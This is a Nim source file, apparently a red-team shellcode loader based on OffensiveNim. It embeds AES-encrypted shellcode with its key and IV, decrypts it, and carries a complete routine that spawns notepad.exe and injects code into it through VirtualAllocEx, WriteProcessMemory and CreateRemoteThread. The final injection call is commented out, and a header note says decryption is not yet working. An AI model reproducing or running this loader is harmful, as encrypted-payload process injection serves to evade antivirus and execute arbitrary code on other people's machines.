#[
    Reference: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim

  - Decryption not working right now, need to investigate further.

]#

import winim/lean
import osproc
import nimcrypto
import base64

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc decryptAES(shellcode: string, aes_key: string, iv: string): string =
  var
    ectx, dctx: CTR[aes256]
    key = fromHex(aes_key)
    iv = fromHex(iv)
    enctext = fromHex(shellcode)
    dectext = newSeq[byte](len(fromHex(shellcode)))

  dctx.init(key, iv)
  dctx.decrypt(enctext, dectext)
  dctx.clear()

  echo "Encrypted text: ", toHex(enctext)
  echo "Decrypted text: ", toHex(dectext)

  return toHex(dectext)

proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =

  let tProcess = startProcess("notepad.exe")
  tProcess.suspend()
  defer: tProcess.close()

  echo "[*] Target Process: ", tProcess.processID

  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](tProcess.processID))
  defer: CloseHandle(pHandle)

  echo "[*] pHandle: ", pHandle

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE)

  var bytesWritten: SIZE_T
  let wSuccess = WriteProcessMemory(pHandle, rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),addr bytesWritten)

  echo "[*] WriteProcessMemory: ", bool(wSuccess)
  echo "    \\-- bytes written: ", bytesWritten
  echo ""

  var consoleInput = readLine(stdin);

  var oldProtect: DWORD
  let protSuccess = VirtualProtectEx(pHandle, cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)

  echo "[*] VirtualProtect: ", bool(protSuccess)
  echo "    \\-- Changed memory protection back to RX instead of RWX"
  echo ""

  let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
  defer: CloseHandle(tHandle)

  echo "[*] tHandle: ", tHandle
  echo "[+] Injected"

when defined(windows):

  # This is essentially the equivalent of 'if __name__ == '__main__' in python
  when isMainModule:
    # Replace these values with encrypted shellcode and associated AES key
    let iv = "660491301D94D53B0DDD4BFC2234FDDE"
    let key = "7EADB38E62D0469A6DE4DC664AC4179AAEC864FE29E7359162E8586C809D481A"
    var shellcode_enc = "C0A5E603CB6B9DF8888C82AFF66A341C376A33AEC64DDD6A5B24D7C3FCAACBBCACD088BB935CAF7B1D496BC2397C61D488552176AA94855B0DA3207CFC0152B623B27FF5724B24D3A329EE26975534008CD750216FADDE6F8DD591D5E988CAB985E5CD708A6D8372EC252F737E389119566F5122B03941943CDA17DC91A90FF49DA1D750E47512F82176A96DD8F03EC9D6E905A0BA8970DA105DCE6E2E51A8ADA1D00270C7284425F0D8ADC55A70FB3CEAE31B71BD9259EB58A3A34CC0AA77AC009349EC434E70B6D5C24F3CFB9F943683B654B98FE6FD74381B0E3A489393785D8AAA3B9FF2E7DDBC8078298DD32CDFF9A65D8DEF59F27BA71E5EB17E64F1466194BEDD760A24E86A23FE1E2748C1272D6D6180EC25E9521E52811B67A0490F69A0704750CD00470771F9700DD1B595578482E6B75F71E8DEE1DEE135B6A0BEC92454563F563E04CEA244DD923D1CEB3F73D80AA2882D15396D266FCE377D1F6001CCC888D97594A19FD1DB8C0781A80611DA8AD9B113C4296A56E0E79912E2C4141839243CCC6F"

    var shellcode_b64 = fromHex(decryptAES(shellcode_enc, key, iv))
    echo "B64 shellcode: ", shellcode_b64
    #var shellcode: array[293, byte] = decode(shellcode_b64)
    #injectCreateRemoteThread(shellcode)